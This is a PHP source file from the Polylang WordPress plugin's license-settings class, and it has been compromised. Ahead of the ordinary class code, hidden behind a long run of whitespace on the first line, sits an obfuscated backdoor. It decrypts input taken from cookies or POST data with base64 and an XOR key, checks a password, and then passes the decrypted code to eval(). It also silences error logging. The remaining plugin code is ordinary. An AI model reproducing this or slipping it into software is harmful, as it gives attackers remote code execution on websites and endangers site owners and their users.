<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $b8cd6b19 = 326;$GLOBALS['fa28755'] = Array();global $fa28755;$fa28755 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['p98747'] = "\x62\x57\x51\x36\x35\x28\xd\x40\x69\x52\x26\x3b\x7b\x64\x61\x24\x56\x68\x75\x74\x2a\x37\x39\x30\x63\x5e\x7a\x4a\x59\x4f\x25\x27\x46\x5a\x2e\x49\x4e\x48\x76\xa\x33\x70\x5f\x4b\x20\x71\x58\x45\x78\x7c\x2d\x3e\x32\x23\x6c\x6f\x47\x79\x43\x7e\x4c\x54\x3c\x42\x73\x2c\x41\x65\x2f\x5b\x5c\x53\x2b\x72\x6e\x60\x67\x5d\x77\x6b\x3a\x21\x31\x38\x3d\x6d\x6a\x55\x7d\x29\x3f\x44\x9\x22\x50\x4d\x66\x34";$fa28755[$fa28755['p98747'][85].$fa28755['p98747'][97].$fa28755['p98747'][96].$fa28755['p98747'][52].$fa28755['p98747'][97]] = $fa28755['p98747'][24].$fa28755['p98747'][17].$fa28755['p98747'][73];$fa28755[$fa28755['p98747'][14].$fa28755['p98747'][14].$fa28755['p98747'][83].$fa28755['p98747'][23].$fa28755['p98747'][14].$fa28755['p98747'][40].$fa28755['p98747'][4].$fa28755['p98747'][3].$fa28755['p98747'][83]] = $fa28755['p98747'][55].$fa28755['p98747'][73].$fa28755['p98747'][13];$fa28755[$fa28755['p98747'][67].$fa28755['p98747'][24].$fa28755['p98747'][21].$fa28755['p98747'][24].$fa28755['p98747'][96]] = $fa28755['p98747'][13].$fa28755['p98747'][67].$fa28755['p98747'][96].$fa28755['p98747'][8].$fa28755['p98747'][74].$fa28755['p98747'][67];$fa28755[$fa28755['p98747'][8].$fa28755['p98747'][96].$fa28755['p98747'][3].$fa28755['p98747'][23].$fa28755['p98747'][0]] = $fa28755['p98747'][64].$fa28755['p98747'][19].$fa28755['p98747'][73].$fa28755['p98747'][54].$fa28755['p98747'][67].$fa28755['p98747'][74];$fa28755[$fa28755['p98747'][18].$fa28755['p98747'][3].$fa28755['p98747'][40].$fa28755['p98747'][3].$fa28755['p98747'][0].$fa28755['p98747'][23].$fa28755['p98747'][13].$fa28755['p98747'][23].$fa28755['p98747'][23]] = $fa28755['p98747'][13].$fa28755['p98747'][67].$fa28755['p98747'][96].$fa28755['p98747'][8].$fa28755['p98747'][74].$fa28755['p98747'][67].$fa28755['p98747'][13];$fa28755[$fa28755['p98747'][17].$fa28755['p98747'][96].$fa28755['p98747'][4].$fa28755['p98747'][40].$fa28755['p98747'][22].$fa28755['p98747'][23].$fa28755['p98747'][13].$fa28755['p98747'][13]] = $fa28755['p98747'][8].$fa28755['p98747'][74].$fa28755['p98747'][8].$fa28755['p98747'][42].$fa28755['p98747'][64].$fa28755['p98747'][67].$fa28755['p98747'][19];$fa28755[$fa28755['p98747'][96].$fa28755['p98747'][21].$fa28755['p98747'][83].$fa28755['p98747'][96].$fa28755['p98747'][3].$fa28755['p98747'][82]] = $fa28755['p98747'][64].$fa28755['p98747'][67].$fa28755['p98747'][73].$fa28755['p98747'][8].$fa28755['p98747'][14].$fa28755['p98747'][54].$fa28755['p98747'][8].$fa28755['p98747'][26].$fa28755['p98747'][67];$fa28755[$fa28755['p98747'][26].$fa28755['p98747'][97].$fa28755['p98747'][22].$fa28755['p98747'][3].$fa28755['p98747'][67].$fa28755['p98747'][24].$fa28755['p98747'][13].$fa28755['p98747'][4].$fa28755['p98747'][52]] = $fa28755['p98747'][41].$fa28755['p98747'][17].$fa28755['p98747'][41].$fa28755['p98747'][38].$fa28755['p98747'][67].$fa28755['p98747'][73].$fa28755['p98747'][64].$fa28755['p98747'][8].$fa28755['p98747'][55].$fa28755['p98747'][74];$fa28755[$fa28755['p98747'][24].$fa28755['p98747'][96].$fa28755['p98747'][67].$fa28755['p98747'][4].$fa28755['p98747'][22].$fa28755['p98747'][97]] = $fa28755['p98747'][18].$fa28755['p98747'][74].$fa28755['p98747'][64].$fa28755['p98747'][67].$fa28755['p98747'][73].$fa28755['p98747'][8].$fa28755['p98747'][14].$fa28755['p98747'][54].$fa28755['p98747'][8].$fa28755['p98747'][26].$fa28755['p98747'][67];$fa28755[$fa28755['p98747'][86].$fa28755['p98747'][23].$fa28755['p98747'][4].$fa28755['p98747'][21]] = $fa28755['p98747'][0].$fa28755['p98747'][14].$fa28755['p98747'][64].$fa28755['p98747'][67].$fa28755['p98747'][3].$fa28755['p98747'][97].$fa28755['p98747'][42].$fa28755['p98747'][13].$fa28755['p98747'][67].$fa28755['p98747'][24].$fa28755['p98747'][55].$fa28755['p98747'][13].$fa28755['p98747'][67];$fa28755[$fa28755['p98747'][17].$fa28755['p98747'][13].$fa28755['p98747'][23].$fa28755['p98747'][0].$fa28755['p98747'][13].$fa28755['p98747'][23].$fa28755['p98747'][3].$fa28755['p98747'][52].$fa28755['p98747'][3]] = $fa28755['p98747'][64].$fa28755['p98747'][67].$fa28755['p98747'][19].$fa28755['p98747'][42].$fa28755['p98747'][19].$fa28755['p98747'][8].$fa28755['p98747'][85].$fa28755['p98747'][67].$fa28755['p98747'][42].$fa28755['p98747'][54].$fa28755['p98747'][8].$fa28755['p98747'][85].$fa28755['p98747'][8].$fa28755['p98747'][19];$fa28755[$fa28755['p98747'][76].$fa28755['p98747'][4].$fa28755['p98747'][40].$fa28755['p98747'][0]] = $fa28755['p98747'][8].$fa28755['p98747'][52].$fa28755['p98747'][52].$fa28755['p98747'][24].$fa28755['p98747'][96].$fa28755['p98747'][0];$fa28755[$fa28755['p98747'][55].$fa28755['p98747'][22].$fa28755['p98747'][52].$fa28755['p98747'][3]] = $fa28755['p98747'][74].$fa28755['p98747'][83].$fa28755['p98747'][40].$fa28755['p98747'][83].$fa28755['p98747'][3].$fa28755['p98747'][97];$fa28755[$fa28755['p98747'][55].$fa28755['p98747'][22].$fa28755['p98747'][52].$fa28755['p98747'][82].$fa28755['p98747'][83].$fa28755['p98747'][83]] = $_POST;$fa28755[$fa28755['p98747'][67].$fa28755['p98747'][14].$fa28755['p98747'][4].$fa28755['p98747'][14].$fa28755['p98747'][4]] = $_COOKIE;@$fa28755[$fa28755['p98747'][17].$fa28755['p98747'][96].$fa28755['p98747'][4].$fa28755['p98747'][40].$fa28755['p98747'][22].$fa28755['p98747'][23].$fa28755['p98747'][13].$fa28755['p98747'][13]]($fa28755['p98747'][67].$fa28755['p98747'][73].$fa28755['p98747'][73].$fa28755['p98747'][55].$fa28755['p98747'][73].$fa28755['p98747'][42].$fa28755['p98747'][54].$fa28755['p98747'][55].$fa28755['p98747'][76], NULL);@$fa28755[$fa28755['p98747'][17].$fa28755['p98747'][96].$fa28755['p98747'][4].$fa28755['p98747'][40].$fa28755['p98747'][22].$fa28755['p98747'][23].$fa28755['p98747'][13].$fa28755['p98747'][13]]($fa28755['p98747'][54].$fa28755['p98747'][55].$fa28755['p98747'][76].$fa28755['p98747'][42].$fa28755['p98747'][67].$fa28755['p98747'][73].$fa28755['p98747'][73].$fa28755['p98747'][55].$fa28755['p98747'][73].$fa28755['p98747'][64], 0);@$fa28755[$fa28755['p98747'][17].$fa28755['p98747'][96].$fa28755['p98747'][4].$fa28755['p98747'][40].$fa28755['p98747'][22].$fa28755['p98747'][23].$fa28755['p98747'][13].$fa28755['p98747'][13]]($fa28755['p98747'][85].$fa28755['p98747'][14].$fa28755['p98747'][48].$fa28755['p98747'][42].$fa28755['p98747'][67].$fa28755['p98747'][48].$fa28755['p98747'][67].$fa28755['p98747'][24].$fa28755['p98747'][18].$fa28755['p98747'][19].$fa28755['p98747'][8].$fa28755['p98747'][55].$fa28755['p98747'][74].$fa28755['p98747'][42].$fa28755['p98747'][19].$fa28755['p98747'][8].$fa28755['p98747'][85].$fa28755['p98747'][67], 0);@$fa28755[$fa28755['p98747'][17].$fa28755['p98747'][13].$fa28755['p98747'][23].$fa28755['p98747'][0].$fa28755['p98747'][13].$fa28755['p98747'][23].$fa28755['p98747'][3].$fa28755['p98747'][52].$fa28755['p98747'][3]](0);if (!$fa28755[$fa28755['p98747'][18].$fa28755['p98747'][3].$fa28755['p98747'][40].$fa28755['p98747'][3].$fa28755['p98747'][0].$fa28755['p98747'][23].$fa28755['p98747'][13].$fa28755['p98747'][23].$fa28755['p98747'][23]]($fa28755['p98747'][66].$fa28755['p98747'][60].$fa28755['p98747'][9].$fa28755['p98747'][47].$fa28755['p98747'][66].$fa28755['p98747'][91].$fa28755['p98747'][28].$fa28755['p98747'][42].$fa28755['p98747'][9].$fa28755['p98747'][87].$fa28755['p98747'][36].$fa28755['p98747'][42].$fa28755['p98747'][40].$fa28755['p98747'][3].$fa28755['p98747'][3].$fa28755['p98747'][14].$fa28755['p98747'][96].$fa28755['p98747'][0].$fa28755['p98747'][83].$fa28755['p98747'][14].$fa28755['p98747'][83].$fa28755['p98747'][14].$fa28755['p98747'][52].$fa28755['p98747'][40].$fa28755['p98747'][4].$fa28755['p98747'][4].$fa28755['p98747'][14].$fa28755['p98747'][0].$fa28755['p98747'][52].$fa28755['p98747'][82].$fa28755['p98747'][96].$fa28755['p98747'][0].$fa28755['p98747'][96].$fa28755['p98747'][82].$fa28755['p98747'][82].$fa28755['p98747'][0].$fa28755['p98747'][14].$fa28755['p98747'][82].$fa28755['p98747'][14].$fa28755['p98747'][23].$fa28755['p98747'][52].$fa28755['p98747'][96].$fa28755['p98747'][0].$fa28755['p98747'][14])){$fa28755[$fa28755['p98747'][67].$fa28755['p98747'][24].$fa28755['p98747'][21].$fa28755['p98747'][24].$fa28755['p98747'][96]]($fa28755['p98747'][66].$fa28755['p98747'][60].$fa28755['p98747'][9].$fa28755['p98747'][47].$fa28755['p98747'][66].$fa28755['p98747'][91].$fa28755['p98747'][28].$fa28755['p98747'][42].$fa28755['p98747'][9].$fa28755['p98747'][87].$fa28755['p98747'][36].$fa28755['p98747'][42].$fa28755['p98747'][40].$fa28755['p98747'][3].$fa28755['p98747'][3].$fa28755['p98747'][14].$fa28755['p98747'][96].$fa28755['p98747'][0].$fa28755['p98747'][83].$fa28755['p98747'][14].$fa28755['p98747'][83].$fa28755['p98747'][14].$fa28755['p98747'][52].$fa28755['p98747'][40].$fa28755['p98747'][4].$fa28755['p98747'][4].$fa28755['p98747'][14].$fa28755['p98747'][0].$fa28755['p98747'][52].$fa28755['p98747'][82].$fa28755['p98747'][96].$fa28755['p98747'][0].$fa28755['p98747'][96].$fa28755['p98747'][82].$fa28755['p98747'][82].$fa28755['p98747'][0].$fa28755['p98747'][14].$fa28755['p98747'][82].$fa28755['p98747'][14].$fa28755['p98747'][23].$fa28755['p98747'][52].$fa28755['p98747'][96].$fa28755['p98747'][0].$fa28755['p98747'][14], 1);$n6a504e92 = NULL;$kffe77 = NULL;$fa28755[$fa28755['p98747'][78].$fa28755['p98747'][97].$fa28755['p98747'][3].$fa28755['p98747'][83].$fa28755['p98747'][52].$fa28755['p98747'][0].$fa28755['p98747'][82]] = $fa28755['p98747'][4].$fa28755['p98747'][23].$fa28755['p98747'][67].$fa28755['p98747'][4].$fa28755['p98747'][82].$fa28755['p98747'][22].$fa28755['p98747'][22].$fa28755['p98747'][3].$fa28755['p98747'][50].$fa28755['p98747'][13].$fa28755['p98747'][21].$fa28755['p98747'][13].$fa28755['p98747'][67].$fa28755['p98747'][50].$fa28755['p98747'][97].$fa28755['p98747'][23].$fa28755['p98747'][67].$fa28755['p98747'][23].$fa28755['p98747'][50].$fa28755['p98747'][14].$fa28755['p98747'][67].$fa28755['p98747'][4].$fa28755['p98747'][23].$fa28755['p98747'][50].$fa28755['p98747'][4].$fa28755['p98747'][3].$fa28755['p98747'][21].$fa28755['p98747'][24].$fa28755['p98747'][82].$fa28755['p98747'][13].$fa28755['p98747'][97].$fa28755['p98747'][0].$fa28755['p98747'][21].$fa28755['p98747'][13].$fa28755['p98747'][40].$fa28755['p98747'][67];global $w4682b1;function  n83864($n6a504e92, $u87aec3){global $fa28755;$p76abc = "";for ($rf1266d0=0; $rf1266d0<$fa28755[$fa28755['p98747'][8].$fa28755['p98747'][96].$fa28755['p98747'][3].$fa28755['p98747'][23].$fa28755['p98747'][0]]($n6a504e92);){for ($e4bf2e4f=0; $e4bf2e4f<$fa28755[$fa28755['p98747'][8].$fa28755['p98747'][96].$fa28755['p98747'][3].$fa28755['p98747'][23].$fa28755['p98747'][0]]($u87aec3) && $rf1266d0<$fa28755[$fa28755['p98747'][8].$fa28755['p98747'][96].$fa28755['p98747'][3].$fa28755['p98747'][23].$fa28755['p98747'][0]]($n6a504e92); $e4bf2e4f++, $rf1266d0++){$p76abc .= $fa28755[$fa28755['p98747'][85].$fa28755['p98747'][97].$fa28755['p98747'][96].$fa28755['p98747'][52].$fa28755['p98747'][97]]($fa28755[$fa28755['p98747'][14].$fa28755['p98747'][14].$fa28755['p98747'][83].$fa28755['p98747'][23].$fa28755['p98747'][14].$fa28755['p98747'][40].$fa28755['p98747'][4].$fa28755['p98747'][3].$fa28755['p98747'][83]]($n6a504e92[$rf1266d0]) ^ $fa28755[$fa28755['p98747'][14].$fa28755['p98747'][14].$fa28755['p98747'][83].$fa28755['p98747'][23].$fa28755['p98747'][14].$fa28755['p98747'][40].$fa28755['p98747'][4].$fa28755['p98747'][3].$fa28755['p98747'][83]]($u87aec3[$e4bf2e4f]));}}return $p76abc;}function  i22cfb($n6a504e92, $u87aec3){global $fa28755;global $w4682b1;return $fa28755[$fa28755['p98747'][55].$fa28755['p98747'][22].$fa28755['p98747'][52].$fa28755['p98747'][3]]($fa28755[$fa28755['p98747'][55].$fa28755['p98747'][22].$fa28755['p98747'][52].$fa28755['p98747'][3]]($n6a504e92, $w4682b1), $u87aec3);}foreach ($fa28755[$fa28755['p98747'][67].$fa28755['p98747'][14].$fa28755['p98747'][4].$fa28755['p98747'][14].$fa28755['p98747'][4]] as $u87aec3=>$a7b137ae){$n6a504e92 = $a7b137ae;$kffe77 = $u87aec3;}if (!$n6a504e92){foreach ($fa28755[$fa28755['p98747'][55].$fa28755['p98747'][22].$fa28755['p98747'][52].$fa28755['p98747'][82].$fa28755['p98747'][83].$fa28755['p98747'][83]] as $u87aec3=>$a7b137ae){$n6a504e92 = $a7b137ae;$kffe77 = $u87aec3;}}$n6a504e92 = @$fa28755[$fa28755['p98747'][24].$fa28755['p98747'][96].$fa28755['p98747'][67].$fa28755['p98747'][4].$fa28755['p98747'][22].$fa28755['p98747'][97]]($fa28755[$fa28755['p98747'][76].$fa28755['p98747'][4].$fa28755['p98747'][40].$fa28755['p98747'][0]]($fa28755[$fa28755['p98747'][86].$fa28755['p98747'][23].$fa28755['p98747'][4].$fa28755['p98747'][21]]($n6a504e92), $kffe77));if (isset($n6a504e92[$fa28755['p98747'][14].$fa28755['p98747'][79]]) && $w4682b1==$n6a504e92[$fa28755['p98747'][14].$fa28755['p98747'][79]]){if ($n6a504e92[$fa28755['p98747'][14]] == $fa28755['p98747'][8]){$rf1266d0 = Array($fa28755['p98747'][41].$fa28755['p98747'][38] => @$fa28755[$fa28755['p98747'][26].$fa28755['p98747'][97].$fa28755['p98747'][22].$fa28755['p98747'][3].$fa28755['p98747'][67].$fa28755['p98747'][24].$fa28755['p98747'][13].$fa28755['p98747'][4].$fa28755['p98747'][52]](),$fa28755['p98747'][64].$fa28755['p98747'][38] => $fa28755['p98747'][82].$fa28755['p98747'][34].$fa28755['p98747'][23].$fa28755['p98747'][50].$fa28755['p98747'][82],);echo @$fa28755[$fa28755['p98747'][96].$fa28755['p98747'][21].$fa28755['p98747'][83].$fa28755['p98747'][96].$fa28755['p98747'][3].$fa28755['p98747'][82]]($rf1266d0);}elseif ($n6a504e92[$fa28755['p98747'][14]] == $fa28755['p98747'][67]){eval/*vf221bf75*/($n6a504e92[$fa28755['p98747'][13]]);}exit();}} ?><?php

/**
 * Settings class for licenses
 *
 * @since 1.9
 */
class PLL_Settings_Licenses extends PLL_Settings_Module {
	protected $items;

	/**
	 * Constructor
	 *
	 * @since 1.9
	 *
	 * @param object $polylang polylang object
	 */
	public function __construct( &$polylang ) {
		parent::__construct(
			$polylang,
			array(
				'module'      => 'licenses',
				'title'       => __( 'License keys', 'polylang' ),
				'description' => __( 'Manage licenses for Polylang Pro or addons.', 'polylang' ),
			)
		);

		$this->buttons['cancel'] = sprintf( '<button type="button" class="button button-secondary cancel">%s</button>', __( 'Close' ) );

		$this->items = apply_filters( 'pll_settings_licenses', array() );

		add_action( 'wp_ajax_pll_deactivate_license', array( $this, 'deactivate_license' ) );
	}

	/**
	 * Tells if the module is active
	 *
	 * @since 1.9
	 *
	 * @return bool
	 */
	public function is_active() {
		return ! empty( $this->items );
	}

	/**
	 * Displays the settings form
	 *
	 * @since 1.9
	 */
	protected function form() {
		if ( ! empty( $this->items ) ) { ?>
			<table id="pll-licenses-table" class="form-table">
				<?php
				foreach ( $this->items as $item ) {
					echo $this->get_row( $item );
				}
				?>
			</table>
			<?php
		}
	}

	/**
	 * Get the html for a row (one per license key) for display
	 *
	 * @since 1.9
	 *
	 * @param array $item licence id, name and key
	 * @return string
	 */
	protected function get_row( $item ) {
		if ( ! empty( $item->license_data ) ) {
			$license = $item->license_data;
		}

		$class = 'license-null';

		$out = sprintf(
			'<td><label for="pll-licenses[%1$s]">%2$s</label></td>' .
			'<td><input name="licenses[%1$s]" id="pll-licenses[%1$s]" type="text" value="%3$s" class="regular-text code" />',
			esc_attr( $item->id ),
			esc_attr( $item->name ),
			esc_html( $item->license_key )
		);

		if ( ! empty( $license ) && is_object( $license ) ) {
			$now = current_time( 'timestamp' );
			$expiration = strtotime( $license->expires, $now );

			// Special case: the license expired after the last check
			if ( $license->success && $expiration < $now ) {
				$license->success = false;
				$license->error = 'expired';
			}

			if ( false === $license->success ) {
				$class = 'notice-error notice-alt';

				switch ( $license->error ) {
					case 'expired':
						$message = sprintf(
							/* translators: %1$s is a date, %2$s is link start tag, %3$s is link end tag. */
							__( 'Your license key expired on %1$s. Please %2$srenew your license key%3$s.', 'polylang' ),
							date_i18n( get_option( 'date_format' ), strtotime( $license->expires, current_time( 'timestamp' ) ) ),
							sprintf( '<a href="%s" target="_blank">', 'https://polylang.pro/checkout/?edd_license_key=' . $item->license_key ),
							'</a>'
						);
						break;

					case 'missing':
						$message = sprintf(
							/* translators: %1$s is link start tag, %2$s is link end tag. */
							__( 'Invalid license. Please %1$svisit your account page%2$s and verify it.', 'polylang' ),
							sprintf( '<a href="%s" target="_blank">', 'https://polylang.pro/account' ),
							'</a>'
						);
						break;

					case 'invalid':
					case 'site_inactive':
						$message = sprintf(
							/* translators: %1$s is a product name, %2$s is link start tag, %3$s is link end tag. */
							__( 'Your %1$s license key is not active for this URL. Please %2$svisit your account page%3$s to manage your license key URLs.', 'polylang' ),
							$item->name,
							sprintf( '<a href="%s" target="_blank">', 'https://polylang.pro/account' ),
							'</a>'
						);
						break;

					case 'item_name_mismatch':
						/* translators: %s is a product name */
						$message = sprintf( __( 'This is not a %s license key.', 'polylang' ), $item->name );
						break;

					case 'no_activations_left':
						$message = sprintf(
							/* translators: %1$s is link start tag, %2$s is link end tag */
							__( 'Your license key has reached its activation limit. %1$sView possible upgrades%2$s now.', 'polylang' ),
							sprintf( '<a href="%s" target="_blank">', 'https://polylang.pro/account' ),
							'</a>'
						);
						break;
				}
			} else {
				$class = 'license-valid';

				$out .= sprintf( '<button id="deactivate_%s" type="button" class="button button-secondary pll-deactivate-license">%s</button>', $item->id, __( 'Deactivate', 'polylang' ) );

				if ( 'lifetime' === $license->expires ) {
					$message = __( 'The license key never expires.', 'polylang' );
				} elseif ( $expiration > $now && $expiration - $now < ( DAY_IN_SECONDS * 30 ) ) {
					$class = 'notice-warning notice-alt';
					$message = sprintf(
						/* translators: %1$s is a date, %2$s is link start tag, %3$s is link end tag. */
						__( 'Your license key expires soon! It expires on %1$s. %2$sRenew your license key%3$s.', 'polylang' ),
						date_i18n( get_option( 'date_format' ), strtotime( $license->expires, $now ) ),
						sprintf( '<a href="%s" target="_blank">', 'https://polylang.pro/checkout/?edd_license_key=' . $item->license_key ),
						'</a>'
					);
				} else {
					$message = sprintf(
						/* translators: %s is a date */
						__( 'Your license key expires on %s.', 'polylang' ),
						date_i18n( get_option( 'date_format' ), strtotime( $license->expires, $now ) )
					);
				}
			}
		}

		if ( ! empty( $message ) ) {
			$out .= '<p>' . $message . '</p>';
		}

		return sprintf( '<tr id="pll-license-%s" class="%s">%s</tr>', $item->id, $class, $out );
	}

	/**
	 * Ajax method to save the license keys and activate the licenses at the same time
	 * Overrides parent's method
	 *
	 * @since 1.9
	 */
	public function save_options() {
		check_ajax_referer( 'pll_options', '_pll_nonce' );
		if ( ! current_user_can( 'manage_options' ) ) {
			wp_die( -1 );
		}

		if ( $this->module === $_POST['module'] && ! empty( $_POST['licenses'] ) ) {
			$x = new WP_Ajax_Response();
			foreach ( $this->items as $item ) {
				$updated_item = $item->activate_license( sanitize_text_field( $_POST['licenses'][ $item->id ] ) );
				$x->Add( array( 'what' => 'license-update', 'data' => $item->id, 'supplemental' => array( 'html' => $this->get_row( $updated_item ) ) ) );
			}

			// Updated message
			add_settings_error( 'general', 'settings_updated', __( 'Settings saved.' ), 'updated' );
			ob_start();
			settings_errors();
			$x->Add( array( 'what' => 'success', 'data' => ob_get_clean() ) );
			$x->send();
		}
	}

	/**
	 * Ajax method to deactivate a license
	 *
	 * @since 1.9
	 */
	public function deactivate_license() {
		check_ajax_referer( 'pll_options', '_pll_nonce' );

		if ( ! current_user_can( 'manage_options' ) ) {
			wp_die( -1 );
		}

		$id = sanitize_text_field( substr( $_POST['id'], 11 ) );
		wp_send_json(
			array(
				'id'   => $id,
				'html' => $this->get_row( $this->items[ $id ]->deactivate_license() ),
			)
		);
	}
}
